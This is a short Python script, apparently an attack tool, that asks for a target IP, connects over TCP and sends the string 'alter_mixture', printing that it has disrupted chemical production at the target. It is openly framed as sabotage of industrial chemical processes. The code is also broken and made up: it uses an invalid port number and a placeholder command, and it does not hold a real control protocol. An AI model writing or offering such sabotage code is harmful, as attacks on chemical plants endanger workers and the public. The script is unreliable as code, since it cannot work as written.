import socket
import sys

def disrupt_chemical_production(target):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 100000))
        s.send(b"alter_mixture")
        print(f"Disrupted chemical production at {target}")
        s.close()
    except socket.error:
        print("Couldn't connect to server.")
        sys.exit()

def main():
    target = input("Enter target IP: ")
    disrupt_chemical_production(target)

if __name__ == "__main__":
    main()
